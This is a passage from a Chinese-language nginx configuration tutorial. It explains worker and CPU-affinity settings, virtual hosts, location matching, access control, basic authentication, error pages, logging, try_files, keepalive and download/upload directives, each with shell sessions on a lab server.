server_name;\tlocalhost; #server的域名，配置多个虚拟主机时用到 location / { root\thtml; index\tindex.html index.htm; #网站默认主页 } error_page 500 502 503 504 /50x.html; #错误页面 ##location处理对应的不同错误码的页面定义到50x.html，指示了50.html文件所在目录 location = /50x.html { root\thtml; #错误页面文件所在目录 } } ##和邮件相关的配置 #mail { # ... #} mail 协议相关配置段 #tcp代理配置，1.9版本以上支持 #stream { # ... #} stream 服务器相关配置段 #导入其他路径的配置文件 #include /apps/nginx/conf.d/*.conf } 全局配置 main 全局配置块常见的配置指令分类\n正常运行必备的配置 优化性能相关的配置 用于调试定位问题相关的配置 事件驱动相关的配置 全局配置说明 user\tnginx nginx; #启动nginx工作进程的用户和组 worker_processes [number | auto]; #启动nginx工作进程的数量，一般和CPU核心数相同 worker_cpu_affinity 00000001 00000010 00000100 00001000; #将Nginx工作进程绑定到指定的CPU核心，默认Nginx是不进行进程绑定的，绑定并不是意味着当前nginx进程独占以一核心CPU，但是可以保证此进程不会运行在其他核心上，这就极大减少了nginx的工作进程在不同的cpu核心上的来回跳转，减少了CPU对进程的资源分配与回收以及内存管理等，因此可以有效的提升nginx服务器的性能。 CPU MASK: 00000001：0号CPU 00000010：1号CPU 10000000：7号CPU ##示例: [root@test conf]# egrep \u0026#34;processes|affinity\u0026#34; nginx.conf worker_processes 4;\t#启动四个worker进程 worker_cpu_affinity 0001 0010; #将workr进程绑定到 0号CPU和1号CPU [root@test conf]# lscpu | grep CPU\\(s\\) # CPU核数为2 CPU(s): 2 On-line CPU(s) list: 0,1 NUMA node0 CPU(s): 0,1 [root@test conf]# nginx -t #语法检查出现警告，因为worker进程数比CPU核心数多。多出的worker进程将绑定在‘上一个CPU核心‘也即0010上。对于‘上一个CPU核心’（last mask for remaining worker）的解释： processes：nginx分别将worker进程绑定到worker_cpu_affinity 指定的CPU核心上（从左至右的顺序），而从第三个work进程起并未指定对应的CPU核心，因此全部绑定到‘上一个CPU核心’ 0010这个CPU核心。 nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: [warn] the number of \u0026#34;worker_processes\u0026#34; is not equal to the number of \u0026#34;worker_cpu_affinity\u0026#34; masks, using last mask for remaining worker processes nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@test conf]# ps axo pid,cmd,psr | grep nginx 827 nginx: master process /apps 0 1226 nginx: worker process 0 1227 nginx: worker process 1 1228 nginx: worker process 1 1229 nginx: worker process 1 1249 grep --color=auto nginx 0 #将worker进程数量改为2 [root@test conf]# vim nginx.conf [root@test conf]# egrep \u0026#34;processes|affinity\u0026#34; nginx.conf worker_processes 2; worker_cpu_affinity 0001 0010; #语法检查不再警告 [root@test conf]# nginx -s reload [root@test conf]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@test conf]# ps axo pid,cmd,psr | grep nginx 827 nginx: master process /apps 1 1261 nginx: worker process 0 1262 nginx: worker process 1 1265 grep --color=auto nginx 1 #错误日志记录配置，语法：error_log file [debug | info | notice | warn | error | crit | alert | emerg] #括号内为日志记录详细级别（从左至右逐渐提高） ##示例配置 #error_log logs/error.log; #error_log logs/error.log notice; error_log /apps/nginx/logs/error.log error; #pid文件保存路径 pid /apps/nginx/logs/nginx.pid; worker_priority 0; #工作进程优先级，-20~20(19) worker_rlimit_nofile 65536; #所有worker进程能打开的文件数量上限,包括:Nginx的所有连接（例如与代理服务器的连接等），而不仅仅是与客户端的连接。该值最好与ulimit -n 或者limits.conf的值保持一致, #通过pam限制文件打开数量上限 [root@centos8 ~]#cat /etc/security/limits.conf * soft nofile 1000000 * hard nofile 1000000 #worker进程优先级 [root@test conf]# grep priority nginx.conf worker_priority 0; [root@test conf]# ps -axo pid,cmd,nice | grep nginx 827 nginx: master process /apps 0 1391 nginx: worker process 0 1392 nginx: worker process 0 1449 grep --color=auto nginx 0 daemon off; #前台运行Nginx服务，通常在测试环境或者docker环境中使用 master_process off|on; #是否开启Nginx的master-worker工作模式，仅用于开发调试场景,默认为on events { worker_connections 65536; #设置单个工作进程的最大并发连接数 use epoll; #使用epoll事件驱动，Nginx支持众多的事件驱动，比如:select、poll、epoll，只能设置在events模块中设置。 accept_mutex on; #on为同一时刻一个请求轮流由work进程处理,而防止被同时唤醒所有worker,避免多个睡眠进程被唤醒的设置，默认为off，新请求会唤醒所有worker进程,此过程也称为\u0026#34;惊群\u0026#34;，因此nginx刚安装完以后要进行适当的优化。建议设置为on multi_accept on; #on时Nginx服务器的每个工作进程可以同时接受多个新的网络连接，此指令默认为off，即默认为一个工作进程只能一次接受一个新的网络连接，打开后几个同时接受多个。建议设置为on } 范例：实现nginx的高并发配置\n[root@localhost conf]# ulimit -n 10 [root@localhost conf]# cat /apps/nginx/conf/nginx.conf | grep rlimit worker_rlimit_nofile 100; #默认配置不支持高并发，当worker_rlimit_nofile设置的值大于ulimit -n的值,会出现以下错误日志 [root@localhost conf]# ab -c 5000 -n 10000 http://127.0.0.1/ This is ApacheBench, Version 2.3 \u0026lt;$Revision: 1430300 $\u0026gt; Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 127.0.0.1 (be patient) socket: Too many open files (24) #打开的文件描述符过多 http 配置块 http 协议相关的配置结构\nhttp { ... ... server { #每个server用于定义一个虚拟主机,第一个server为默认虚拟服务器 ... } server { ... server_name #虚拟主机名 root #主目录 alias #路径别名 location [OPERATOR] URL { #指定URL的特性 ... if CONDITION { ... } } } } http 协议配置说明\nhttp { include mime.types; #导入支持的文件类型,是相对于/apps/nginx/conf目录 default_type application/octet-stream; #除mime.types中文件类型外,设置其它文件默认类型，访问其它类型时会提示下载不匹配的类型文件 #日志配置部分 #log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; # \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; # \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; #access_log logs/access.log main; #自定义优化参数 sendfile on; #tcp_nopush on; #在开启了sendfile的情况下，合并请求后统一发送给客户端,必须开启sendfile #tcp_nodelay off; #在开启了keepalived模式下的连接是否启用TCP_NODELAY选项，当为off时，延迟0.2s发送，默认On时，不延迟发送，立即发送用户响应报文。 #keepalive_timeout 0; keepalive_timeout 65 66; #设置会话保持时间,第二个值为响应首部:keep-Alived:timeout=65,可以和第一个值不同 #gzip on; #开启文件压缩 server { listen 80; #设置监听地址和端口 server_name localhost; #设置server name，可以以空格隔开写多个并支持正则表达式，如:*.magedu.com www.magedu.* ~^www\\d+\\.magedu\\.com$ default_server #charset koi8-r; #设置编码格式，默认是俄语格式，建议改为utf-8 #access_log logs/host.access.log main; location / { root html; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; #定义错误页面 location = /50x.html { root html; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ { #以http的方式转发php请求到指定web服务器 # proxy_pass http://127.0.0.1; #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ { #以fastcgi的方式转发php请求到php处理 # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #} # deny access to .htaccess files, if Apache\u0026#39;s document root # concurs with nginx\u0026#39;s one # #location ~ /\\.ht { #拒绝web形式访问指定文件，如很多的网站都是通过.htaccess文件来改变自己的重定向等功能。 # deny all; #} location ~ /passwd.html { deny all; } } # another virtual host using mix of IP-, name-, and port-based configuration # #server { #自定义虚拟server # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / { # root html; # index index.html index.htm; #指定默认网页文件，此指令由ngx_http_index_module模块提供 # } #} # HTTPS server # #server { #https服务器配置 # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_cache shared:SSL:1m; # ssl_session_timeout 5m; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location / { # root html; # index index.html index.htm; # } #} MIME MIME参考文档： https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types\n#在响应报文中将指定的文件扩展名映射至MIME对应的类型 include mime.types; default_type application/octet-stream;#除mime.types中的类型外，指定其它文件的默认MIME类型，浏览器一般会提示下载 types { text/html html; image/gif gif; image/jpeg jpg; } 范例：\n#未定义mime.types类型 [root@localhost nginx]# ll html/mime.types ls: cannot access html/mime.types: No such file or directory [root@localhost nginx]# curl localhost/test.php -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 28 Jul 2022 11:23:54 GMT Content-Type: application/octet-stream #mime未定义的类型默认视为二进制文件处理（如果是浏览器访问，则会下载test.php文件） Content-Length: 20 Last-Modified: Thu, 28 Jul 2022 11:19:48 GMT Connection: keep-alive Keep-Alive: timeout=66 #长连接显示的时长，由keepalive_timeout 65 66; 配置 ETag: \u0026#34;62e270d4-14\u0026#34; Accept-Ranges: bytes #修改默认文件类型 [root@localhost nginx]# cat conf/nginx.conf | grep default_type default_type text/html; [root@localhost nginx]# nginx -s reload [root@localhost nginx]# curl localhost/test.php -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 28 Jul 2022 11:32:15 GMT Content-Type: text/html #将test.php识别为文本文件（如果是浏览器访问，直接显示文件内容） Content-Length: 20 Last-Modified: Thu, 28 Jul 2022 11:19:48 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e270d4-14\u0026#34; Accept-Ranges: bytes 指定响应报文 #是否在响应报文中的Content-Type显示指定的字符集，默认off不显示 charset charset | off; #示例 charset utf-8; #是否在响应报文的Server首部显示nginx版本 server_tokens on | off | build | string; 范例：源码修改server字段\n#如果想自定义响应报文的nginx版本信息，需要修改源码文件，重新编译 #如果server_tokens on，修改 src/core/nginx.h 修改第13-14行，如下示例 #define NGINX_VERSION \u0026#34;1.68.9\u0026#34; #define NGINX_VER \u0026#34;mynginx/\u0026#34; NGINX_VERSION #如果server_tokens off，修改 src/http/ngx_http_header_filter_module.c 第49行，如下示例： static char ngx_http_server_string[] = \u0026#34;Server: nginx\u0026#34; CRLF; #把其中的nginx改为自己想要的文字即可,如：mynginx 核心配置示例 虚拟主机的实现 基于不同的IP、不同的端口以及不用域名实现不同的虚拟主机，依赖于核心模块ngx_http_core_module实现。\n新建两个虚拟主机 # 添加域名解析 [root@localhost conf.d]# cat /etc/hosts |grep test 172.16.16.88 pc.test.org mobile.test.org ## 开始新建虚拟主机 root@localhost nginx]# mkdir /apps/nginx/conf/conf.d [root@localhost nginx]# cd /apps/nginx/conf/conf.d/ [root@localhost conf.d]# vim /apps/nginx/conf/nginx.conf ...... include /apps/nginx/conf.d/*.conf; #在配置文件的最后面添加此行,注意不要放在最前面,会导致前面的配置无法生效（文件配置从上到下依次生效） [root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } } [root@localhost conf.d]# mkdir /apps/nginx/html/pc [root@localhost conf.d]# echo pc_page \u0026gt; /apps/nginx/html/pc/index.html [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org #虚拟主机pc pc_page [root@localhost conf.d]# cat mobile.conf server { listen 80; server_name mobile.test.org; location / { root html/mobile; } } [root@localhost conf.d]# mkdir /apps/nginx/html/mobile #虚拟主机mobile [root@localhost conf.d]# echo mobile_page \u0026gt; /apps/nginx/html/mobile/index.html mobile_page root 与 alias 的区别 root：指定web的家目录，在定义location的时候，文件的绝对路径等于 root+location\n范例:\n[root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /about { root /opt/html; #实际路径为/opt/html/about/index.html } } [root@localhost conf.d]# ll /opt/html/about/ total 4 -rw-r--r-- 1 root root 11 Jul 28 23:24 index.html [root@localhost conf.d]# cat /opt/html/about/index.html about_page [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org/about/ about_page alias：定义路径别名，会把访问的路径重新定义到其指定的路径,文档映射的另一种机制;仅能用于location上下文,此指令使用较少\n范例：\n[root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /about { alias /opt/html; #实际路径为/opt/html/index.html } } [root@localhost conf.d]# cat /opt/html/index.html about_page [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org/about/ about_page localtion 的匹配规则 在一个server中location配置段可存在多个，用于实现从uri到文件系统的路径映射；ngnix会根据用户请\n求的URI来检查定义的所有location，按一定的优先级找出一个最佳匹配，而后进行处理。\nlocation 官方帮助: http://nginx.org/en/docs/http/ngx_http_core_module.html#location\n#语法规则： location [ = | ~ | ~* | ^~ ] uri { ... } = #用于标准uri前，需要请求字串与uri精确匹配，大小敏感,如果匹配成功就停止向下匹配并立即处理请求 ^~ #用于标准uri前，表示包含正则表达式,并且匹配以指定的正则表达式开头,对URI的最左边部分做匹配检查，不区分字符大小写 ~ #用于标准uri前，表示包含正则表达式,并且区分大小写 ~* #用于标准uri前，表示包含正则表达式,并且不区分大小写 不带符号 #匹配起始于此uri的所有的uri \\ #用于标准uri前，表示包含正则表达式并且转义字符。可以将 . * ?等转义为普通符号 #匹配优先级从高到低： =, ^~, ~/~*, 不带符号 官方范例\nlocation = / { [ configuration A ] } location / { [ configuration B ] } location /documents/ { [ configuration C ] } location ^~ /images/ { [ configuration D ] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E ] } The “/” request will match configuration A(?), the “/index.html” request will match configuration B, the “/documents/document.html” request will match configuration C, the “/images/1.gif” request will match configuration D, and the “/documents/1.jpg” request will match configuration E. 匹配案例-精确匹配 在server部分使用location配置一个web界面，例如：当访问nginx服务器的/logo.jpg的时候要显示指定html文件的内容\n精确匹配一般用于匹配网站logo等相对固定的URL\n范例：精确匹配\n[root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /logo.jpg { root html/images; } } [root@localhost images]# ll /apps/nginx/html/images/logo.jpg -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/logo.jpg #访问成功 [root@localhost images]# curl pc.test.org/logo.jpg -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:17:35 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e38835-3336\u0026#34; Accept-Ranges: bytes 匹配案例-区分大小写 ~ 实现区分大小写的模糊匹配\n[root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location ~ /A.?\\.jpg { #匹配字母A开头的jpg图片，后面?表示A后面零次或一个字符 root html/images; } } #确保资源存在 [root@localhost images]# ll /apps/nginx/html/images/A.jpg -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/A.jpg [root@localhost images]# nginx -s reload #以大写URI访问成功 [root@localhost images]# curl -I pc.test.org/A.jpg HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:27:52 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e38835-3336\u0026#34; Accept-Ranges: bytes #以小写URI访问失败 [root@localhost images]# curl -I pc.test.org/a.jpg HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:27:55 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive Keep-Alive: timeout=66 匹配案例-不区分大小写 ~* 用来对用户请求的uri做模糊匹配。\n注意：尽管匹配时不区分大小写，但实际请求是仍会以用户请求的uri去寻找相应的磁盘文件，如用户访问uri为/A.jpg，在location条件通过后就在对应路径下寻找磁盘中的A.jpg文件，如果磁盘上是a.jpg，则请求是失败的（在window系统中，文件名不区分大小写，该请求会成功——受文件系统影响）。\n[root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location ~* /A.?\\.jpg { #匹配规则不区分大小写 root html/images; } } [root@localhost images]# ll /apps/nginx/html/images/a.jpg #磁盘中仅存在a.jpg文件 -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/a.jpg [root@localhost images]# nginx -s reload #访问/a.jpg成功 [root@localhost images]# curl -I pc.test.org/a.jpg HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:41:25 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e38835-3336\u0026#34; Accept-Ranges: bytes #访问/A.jpg失败。location匹配成功，但磁盘上并无A.jpg文件 [root@localhost images]# curl -I pc.test.org/A.jpg HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:41:48 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive Keep-Alive: timeout=66 nginx 四层访问控制 访问控制基于模块ngx_http_access_module实现，可以通过匹配客户端源IP地址进行限制\n注意: 如果能在防火墙设备控制, 最好就不要在nginx上配置,可以更好的节约资源\n官方帮助: http://nginx.org/en/docs/http/ngx_http_access_module.html\n范例：\n## 匹配时按从上至下的规则进行匹配，匹配到相应规则即停止———与防火墙的匹配规则类似 #如：有客户端（IP：10.1.1.0）访问配置了以下规则的web服务器时(访问URI:/about)，触发location /about语句块，匹配到allow 10.1.1.0/16，访问控制生效，访问成功。 location = /login/ { root /data/nginx/html/pc; allow 10.0.0.0/24; deny all; } location /about { alias /data/nginx/html/pc; index index.html; deny 192.168.1.1; allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; deny all; #按先小范围到大范围排序 } nginx 账户认证功能 由 ngx_http_auth_basic_module 模块提供此功能\n官方帮助：http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html\n范例：\n#CentOS安装包 [root@centos8 ~]#yum -y install httpd-tools #Ubuntu安装包 [root@Ubuntu ~]#apt -y install apache2-utils #创建用户 #-b 非交互式方式提交密码 #-c 重新生成文件，覆盖已有文件。首次创建时使用 [root@localhost html]# htpasswd -bc /apps/nginx/conf/.htpasswd user1 passwd1 Adding password for user user1 [root@localhost html]# htpasswd -b /apps/nginx/conf/.htpasswd user2 passwd2 Adding password for user user2 #生成了带有两个用户的验证文件 [root@localhost html]# tail /apps/nginx/conf/.htpasswd user1:$apr1$vzRe30iJ$jF8BZbra6pI8O0JBqlmiP/ user2:$apr1$i2ON7LYs$pxzkeH.xxCdgj670m5cSW/ #网站登录页面配置 [root@localhost html]# cat /apps/nginx/html/index.html hello [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /login { alias html/; index index.html; auth_basic \u0026#34;login password\u0026#34;; #指定提示文本信息 auth_basic_user_file /apps/nginx/conf/.htpasswd; #指定使用的验证文件 } } #直接访问登录页，失败。未通过验证 [root@localhost html]# curl pc.test.org/login/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Authorization Required\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;401 Authorization Required\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ##分别使用两种方式输入用户名和密码验证 [root@localhost html]# curl http://user1:passwd1@pc.test.org/login/ hello [root@localhost html]# curl -u user2:passwd2 pc.test.org/login/ hello 自定义错误页面 自定义错误页，同时也可以用指定的响应状态码进行响应, 可在如下语句块配置：http, server, location, if in\nlocation\n格式：\nerror_page code ... [=[response]] uri; 范例：\n# 准备站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 400 /error.html; #访问不存在的页面，发生404错误，返回error.html错误页面 location /error.html { root html/; } } #准备错误页面 [root@localhost html]# cat /apps/nginx/html/error.html error-page [root@localhost html]# nginx -s reload #访问不存在的页面，触发404报错 [root@localhost html]# curl -I pc.test.org/dd HTTP/1.1 404 Not Found #查看错误码 Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 17:02:12 GMT Content-Type: text/html Content-Length: 11 Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e411d9-b\u0026#34; #触发404错误，返回错误页面（如果是浏览器测试，建议用google） [root@localhost html]# curl pc.test.org/dd error-page 范例：如果发生404 ，将错误码定义为502，且跳转到主页/index.html\n#站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 =502 /index.html; location /index.html { root html/; } } #主页配置 [root@localhost html]# cat /apps/nginx/html/index.html hello [root@localhost html]# nginx -s reload [root@localhost html]# curl pc.test.org/dd/ hello #验证错误码 [root@localhost html]# curl pc.test.org/dd/ -I HTTP/1.1 502 Bad Gateway #错误码为自定义的502 Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 17:31:49 GMT Content-Type: text/html Content-Length: 6 Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e40fa4-6\u0026#34; #重定向成功 [root@localhost html]# cat /apps/nginx/html/index.html hello 自定义错误日志 错误日志格式\nSyntax: error_log file [level]; #格式 Default: #默认值 error_log logs/error.log error; Context: main, http, mail, stream, server, location #可配置的语句块 level: debug, info, notice, warn, error, crit, alert, emerg #日志记录等级 范例：\n#站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 400 /error.html; access_log /apps/nginx/logs/test-access.log; #自定义正常访问日志 error_log /apps/nginx/logs/test-error.log; #自定义错误日志 location /error.html { root html/; } } #当前已有日志文件 [root@localhost html]# ls /apps/nginx/logs/ access.log error.log nginx.pid #重启nginx后生成自定义的错误日志 [root@localhost html]# nginx -s reload [root@localhost html]# ls /apps/nginx/logs/ access.log error.log nginx.pid test-access.log test-error.log #访问站点 [root@localhost html]# curl pc.test.org hello #日志成功记录 [root@localhost html]# tail /apps/nginx/logs/{test-access,test-error}.log ==\u0026gt; /apps/nginx/logs/test-access.log \u0026lt;== 172.16.16.88 - - [30/Jul/2022:01:17:55 +0800] \u0026#34;GET / HTTP/1.1\u0026#34; 200 6 \u0026#34;-\u0026#34; \u0026#34;curl/7.29.0\u0026#34; ==\u0026gt; /apps/nginx/logs/test-error.log \u0026lt;== 检测文件是否存在 try_files会按顺序检查文件是否存在，返回第一个找到的文件或文件夹（结尾加斜线表示为文件夹），如\n果所有文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。只有最后一个参数可以引起一\n个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内\n部500错误。\nSyntax: try_files file ... uri; try_files file ... =code; Default: — Context: server, location 范例: 如果不存在页面, 就转到default.html页面\n#准备站点配置 [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/; index index.html; try_files $uri $uri.html $uri/index.html /about/default.html; } } #准备默认页面 [root@localhost html]# cat /apps/nginx/html/default.html default #访问测试 [root@localhost ~]# cat /apps/nginx/html/about/default.html about_page [root@localhost ~]# curl pc.test.org/xx/ about_page [root@localhost ~]# curl pc.test.org/xx.html about_page ##自定义响应码 [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/; index index.html; try_files $uri $uri.html $uri/index.html =555; #自定义响应码为555 } } #验证结果 [root@localhost ~]# curl pc.test.org/xx.html -I HTTP/1.1 555 #响应码为555 Server: nginx/1.18.0 Date: Mon, 01 Aug 2022 10:00:03 GMT Content-Length: 0 Connection: keep-alive Keep-Alive: timeout=66 长连接配置 keepalive_timeout timeout [header_timeout]; #设定保持连接超时时长，0表示禁止长连接，默认为75s，通常配置在http字段作为站点全局配置 keepalive_requests number; #在一次长连接上所允许请求的资源的最大数量，默认为100次,建议适 当调大,比如:500 范例：\n#站点主配置项 [root@localhost ~]# cat /apps/nginx/conf/nginx.conf | grep keepalive keepalive_requests 3; keepalive_timeout 65 60; [root@localhost ~]# cat /apps/nginx/html/index.html hello #长连接测试 [root@localhost ~]# telnet localhost 80 Trying ::1... telnet: connect to address ::1: Connection refused Trying 127.0.0.1... Connected to localhost. Escape character is \u0026#39;^]\u0026#39;. GET / HTTP/1.1 #发起get请求，重复三次或者时间到达65秒后，本次链接自动终止 HOST: localhost #域名为localhost HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Mon, 01 Aug 2022 11:03:09 GMT Content-Type: text/html Content-Length: 6 Last-Modified: Fri, 29 Jul 2022 16:49:40 GMT Connection: keep-alive Keep-Alive: timeout=60 #显示的超时时间 ETag: \u0026#34;62e40fa4-6\u0026#34; Accept-Ranges: bytes hello #返回的页面内容 作为下载服务器 ngx_http_autoindex_module 模块处理以斜杠字符 \u0026ldquo;/\u0026rdquo; 结尾的请求，并生成目录列表,可以做为下载服务\n配置使用\n官方链接：http://nginx.org/en/docs/http/ngx_http_autoindex_module.html\n相关指令\nautoindex on | off; #自动文件索引功能，默为off autoindex_exact_size on | off; #计算文件精确大小（单位bytes），off 显示大概大小（单位K、M)，默认on autoindex_localtime on | off ; #显示本机时间而非GMT(格林威治)时间，默认off autoindex_format html | xml | json | jsonp; #显示索引的页面文件风格，默认html limit_rate rate; #限制响应客户端传输速率(除GET和HEAD以外的所有方法)，单位B/s,即bytes/second，默认值0,表示无限制,此指令由ngx_http_core_module提供 set $limit_rate 4k; #也可以通变量限速,单位B/s,同时设置,此项优级高于limit_rate ###Rate limit can also be set in the $limit_rate variable, however, since version 1.17.0, this method is not recommended: 范例：将nginx作为下载服务器\n#注意:download不需要index.html文件 [root@centos8 ~]# mkdir -p /data/nginx/html/pc/download [root@localhost ~]# touch /apps/nginx/html/download/{t1,t2,t3}.txt [root@localhost ~]# mkdir /apps/nginx/html/download/{d1,d2,d3} [root@localhost ~]# tree /apps/nginx/html/download /apps/nginx/html/download ├── d1 ├── d2 ├── d3 ├── t1.txt ├── t2.txt └── t3.txt 3 directories, 3 files [root@centos8 ~]# cat /apps/nginx/conf.d/pc.conf location /download { autoindex on; #自动索引功能 autoindex_exact_size off; #计算文件确切大小（单位bytes），此为默认值,off只显示大概大 小（单位kb、mb、gb） autoindex_localtime off; #on表示显示本机时间而非GMT(格林威治)时间,默为为off显示GMT 时间 limit_rate 1024k; #限速,默认不限速 root html/; } 结果验证\n作为上传服务器 相关指令\nclient_max_body_size 1m; #设置允许客户端上传单个文件大小的上限值，默认值为1m,上传文件超过此值会出413错误 client_body_buffer_size size; #用于接收每个客户端请求报文的body部分的缓冲区大小;默认16k;超出此大小时，其将被暂存到磁盘上的由client_body_temp_path指令所定义的位置 client_body_temp_path path [level1 [level2 [level3]]]; #设定存储客户端请求报文的body部分的临时存储路径及子目录结构和数量，目录名为16进制的数字，使用hash之后的值从后往前截取1位、2位、2位作为目录名 [root@centos8 ~]# md5sum /data/nginx/html/pc/index.html 95f6f65f498c74938064851b1bb 96 3d 4 /data/nginx/html/pc/index.html 1级目录占1位16进制，即2^4=16个目录 0-f 2级目录占2位16进制，即2^8=256个目录 00-ff 3级目录占2位16进制，即2^8=256个目录 00-ff #配置示例： client_max_body_size 100m; #如果太大，上传时会出现413错误。注意:如果php上传（如WordPress）,还需要修改/etc/php.ini的相关配置 client_body_buffer_size 1024k; client_body_temp_path /apps/nginx/client_body_temp/ 1 2 2; #上传时,Nginx会自动创建相关目录 ##上传文件后,会自动生成相关目录 [root@wang-liyun-pc ~]# tree /apps/nginx/client_body_temp/ /apps/nginx/client_body_temp/ ├── 5 │ └── 00 │ └── 00 └── 6 └── 00 └── 00 其他配置 keepalive_disable none | browser ...; #对哪种浏览器禁用长连接 limit_except method ... { ... } #仅用于location语句块，禁止客户端使用除了指定的请求方法之外的其它方法, 如果使用会出现403错误 method:GET, HEAD, POST, PUT, DELETE，MKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH ##示例：除了GET之外的其它方法仅允许172.16.16.0/24网段主机使用 [root@localhost ~]# hostname -I #本机IP 172.16.16.88 [root@localhost ~]# ll /apps/nginx/html/upload/ #新建upload目录用于存储上传的文件 total 0 [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /upload { root html/; index index.html; limit_except GET { allow 172.16.16.88; deny all; } } } [root@localhost ~]# nginx -s reload [root@localhost ~]# curl -XPUT /etc/issue pc.test.org/upload curl: (3) \u0026lt;url\u0026gt; malformed \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;405 Not Allowed\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; #PUT方法具有访问权限，但是程序本身不支持文件上传功能 \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;405 Not Allowed\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name 